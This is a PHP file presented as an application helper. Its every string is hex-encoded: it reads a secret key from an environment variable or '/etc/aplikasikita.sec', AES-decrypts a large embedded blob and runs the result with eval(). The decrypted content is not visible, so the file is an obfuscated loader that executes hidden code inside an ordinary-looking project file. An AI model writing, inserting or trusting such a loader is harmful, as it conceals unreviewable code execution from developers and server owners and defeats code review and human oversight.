<?php
namespace App\Helpers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('AEBfQM9w39ozkhqUtgEkKQ==');

$c=base64_decode(

'WX6iBPy+rr/LQqG76aw5UFkySKhEXgY5OlFveYgn3T+WmUNLtU/jNp60eeR/fXxc39/d2PwLq4cG' .
'/amCDCK4tdaPYVWLVGwRjBlq6CWTmrnRYoxFTJxZ0KOPxnO1Olooq6Tjb4KjGUAL4LCqbR887onh' .
's3sAMIc+E7SIQjv8+/4VpLWaeKkbMjiMvI1++kjdVOCMenY9n8tGSVbaAgizsyYUIh/zavh66Af8' .
'AwwiDgIPPCwwrkUgUQOolX48kmJPZ5XpUDDGOokD9UtUtoxYLhGLxVN6ec5p76Q1wdI39IsCeUpU' .
'OiZjiGvJlUh8eshwwPCGVfB+ZPlxHi3pwcH1t+eZB9zNBxNjyDv1BWTrVcwMKWqoX8qSn6kDv4d5' .
'Bt83xgHi9ApkNldp48f5+SDFuYQ+zuHHr0It6kIrGlzlc+yktHYRmymsTP9MqOJqBWGgz8GkkVoV' .
'f785cBzmlXoZ7DbUR4r8C5vTcy2jFQsYbIBG/G5cAOV8PEiuE5savN3gJEv+EZnO7GzHvmJf95WS' .
'1oOvKLChZ/7wkADL91tV+zmtFf79MDg6ecLt7l7+Lb9IscLHBFLqARWquf6etZUN3VCsYhtrOpxK' .
'3sztUsIlHi4dUAS/zqJArOCURdPQIJE0e2Zp97oWcA8lLOputVoKxvDnW1FN+L/zLBxCN1WZqZm8' .
'cBCq3BsuAwFjMK3Zsxye6BKn/SE+TQQ593P6HuU2JZ2VoyHznMOIOJEwB+EkxV3Q/GrViAVG9KNc' .
'NJfeTnIJbfPemlHp+pk4JoiHBimSG5/G9/ycMfEJpDyqgaMOCwoJxmPyD5PqjsluBLtlJbwvWlJM' .
'CEMyBBJMP4E++DuAydMw+VYpbItL66d1Cmrlz0Ov5VkwbcObH4fCSdXJa3DGZiQwoNJwhKRe7rpu' .
'8LKXDZIVE8de0Mj+UIDeWTaVoyAAiFergOxXPVwbpE74X9TguozuGeCMH+CEuds+Tu/1US8HLvIT' .
'tX0wWDDXDsZTz0wohNYopwukbRt+K9zEyzYjQwlK1KaZJgxVP+sKZM4WuFGz1AW38rkW0VaIB8Ug' .
'bysMz4WLX37BTEidtPbu+JujJyDTGuvpICZBGSPEFt0RNeDYPhTcth8uC3xj3LkFgoHfWPqjQaCu' .
'cOdbIt/lHoiYEVzoURYR/25xfrmpbQ3Y2bDC9oVx9gG9BXmiPQABv8CwWopOpzMJIhWjyNeBDzoM' .
'7qqh8Zp/MO+1vE874sy0cpYqz5HDwyHLlQHuP4Z0LsGF4pSGBUdkoE5S1lc8j9fjMGvC56s8x+6W' .
'nxCTqqIGKohNp2v4eLl6qngd3yoP2YtRQeAOikAFyeJJERmGsKLh1v6eRyrQOec8cf8j1d9cI2x9' .
'xP1bQg5tj0ZYAx8VzYshu3KgV59FX1KK0Yu8+D2cHFd47oc+rc1skNpxfsdU0SdvAE/CHwRUh7mE' .
'ioMKhamao5AEx8Gs8QJIbfeilJIpYBmZpOLgr57IT4N1yBhVVaPrpr3s9JfaQX6QlcfF0Dgj421N' .
'XjUFMZQ+mHb0X8V2wnd+dN2QVovja4Cvn5YzruVWGg9PQtC+of2AEF9epxQsEAKvwO4GRivongSI' .
'Af9DPsLI/XsV+1/VxBYbTROdoAjHPb1O4LPSTusZycYY6DuP6WbUgfZ3Fjd2gaXQNEQew5OWkQir' .
'89CD3mRxzyIFXdvUbMHmeCcePOYPadIkwLav4WyUPACt6CoqhOkMQsvw0+RTeuE8yYaMFgcOwoNS' .
'NZkqYPT+FsvsVS9w5NBAcu8A3Dj+A3ZCjHSzdZxc4xdi9g0Rv5kYwHB4kRvIV+7rL0C5rMbr8ETk' .
'Rrxk9TyAfd1Glt80C/VLcWs+Iuz48xQasbNiY7yAeUMGYFRsi3ncl0djhM5SMc1/QAQL1ys2Bk6g' .
'mmF8/XyI7kBHRjK1ygiOdWWP+5d4XjNmyDd1qck8eA8P/W/Pq7EAQFYwiMHLYKuh1ioIzG1D7f68' .
'NYFhgXMeMw+2UnVRX4F/or7iR6jYaNmjibIdi73/OyUEdwjzv9hIy8362vbWwyufEajkOTq/QagY' .
'xJuQX36UQDPDR0x/jqaBwhLsaLdfw7OVBuv74BdgLd6FKahlVA2QiZYixV7RsEqzyKgUCORB9j7R' .
'BR9kB7069i8tilsD0QroikCw7LajkUZ1RJrgo69Ra+4fIwb7aX2MoPgAlwbJ+Jmz4Qp3ZPDere+J' .
'OmH+/CiqjaR9d3As2hdCoXa8VpCcjmmQJ8kBND1zkU9324Dmt+HZlOeh0J1IUaw/ryxkVQYQMGM9' .
'j02sWxviqv1wlr5rnnDFGIP6ii7czeeqawlEW03VljMf7eM29f0M4nULcRJgH7hwbFfWExTkz1Be' .
'QGNc+2SDxDGL4BGjhmO5brDLjzqEOz6aajl//aPB42JnIo51OFXHD6K4eH1QhklqEdZAilrJhzc7' .
'VUMWSFMmgoP3yzscIqPsGr2IehMVnRYZH0I30MQa8jnbsIlsZ9e4kmuK9J92c+Wdjl5SIeD+AfND' .
'4GbtoKQC2HTunc3HaY20XNqwyqje/OEGo6i97Wn2+NwlrhIn/7cFjQdeZexqUqmn6YQOzRSxlsyR' .
'00WTqvt6scxSbGfE9phLYojCrXsbZmQscPCr/e3Q4cmpcoVTMZ/JJ4iGIx8LpwJYCW0wtfOk6nRw' .
'EDvLRjwoeV7p23aGxmtavNwiwpAY3hHczszuvVaCI+1ql4Owm1Zi+hQ4nRWwil3/3OaReVpJzsuv' .
'pzVrnkXir15pT1Lpqtl9kHm1HVLhX86d9U2MeaJnv0ey2lyRBvp1HF0ob39GZPXxVGs5DvI9QRxw' .
'gIb+cBJXoXklY1HAMg8dxobVvjR9nxmL0mXxmyMl2giDJsAEX1xMYIdlzH8tZDXhEtlQrVjGoQVc' .
'Nova4V8Y/oyPA6WNYV3NUohHYBg7twZY1ihjnd6wqDTtYDCEpkn2BxGE4gmWTwG5eh08qE8hEkqr' .
'yq3BQ9ux680Dx5UoGXnzMjg='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

